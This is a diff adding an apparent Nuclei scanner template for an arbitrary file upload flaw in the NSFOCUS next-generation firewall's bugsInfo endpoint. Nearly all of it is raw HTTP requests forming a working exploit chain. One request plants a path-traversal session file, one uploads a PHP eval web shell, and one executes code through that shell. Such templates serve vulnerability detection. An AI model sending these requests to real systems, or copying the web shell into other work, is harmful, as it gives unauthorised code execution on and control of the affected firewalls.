@@ -1,0 +1,57 @@
+id: nsfocus-resourse-arbitrary-file-upload
+info:
+  name: NSFOCUS resourse.php Arbitrary File Upload Vulnerability
+  author: ProjectDiscoveryAI
+  severity: critical
+  description: |
+    NSFOCUS Next Generation Firewall is a dedicated security firewall device.
+    There is an arbitrary file upload vulnerability in the NSFOCUS next-generation firewall bugsInfo/resourse.php file.
+    An attacker can upload a malicious Trojan to gain server permissions.
+  tags: code-execution
+http:
+  - raw:
+      - |
+        POST /api/v1/device/bugsInfo HTTP/1.1
+        Host: {{Hostname}}:8081
+        Content-Type: multipart/form-data; boundary=1d52ba2a11ad8a915eddab1a0e85acd9
+
+        --1d52ba2a11ad8a915eddab1a0e85acd9
+        Content-Disposition: form-data; name="file"; filename="sess_82c13f359d0dd8f51c29d658a9c8ac71"
+
+        lang|s:52:"../../../../../../../../../../../../../../../../tmp/";
+        --1d52ba2a11ad8a915eddab1a0e85acd9--
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "upload file success"
+  - raw:
+      - |
+        POST /api/v1/device/bugsInfo HTTP/1.1
+        Host: {{Hostname}}:8081
+        Content-Type: multipart/form-data; boundary=4803b59d015026999b45993b1245f0ef
+
+        --4803b59d015026999b45993b1245f0ef
+        Content-Disposition: form-data; name="file"; filename="compose.php"
+
+        <?php eval($_POST[1]);?>
+        --4803b59d015026999b45993b1245f0ef--
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "upload file success"
+  - raw:
+      - |
+        POST /mail/include/header_main.php HTTP/1.1
+        Host: {{Hostname}}:4433
+        Content-Type: application/x-www-form-urlencoded
+        Cookie: PHPSESSID_NF=82c13f359d0dd8f51c29d658a9c8ac71
+
+        1=print+md5%281%29%3B
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "c4ca4238a0b923820dcc509a6f75849b"
+    matchers-condition: and
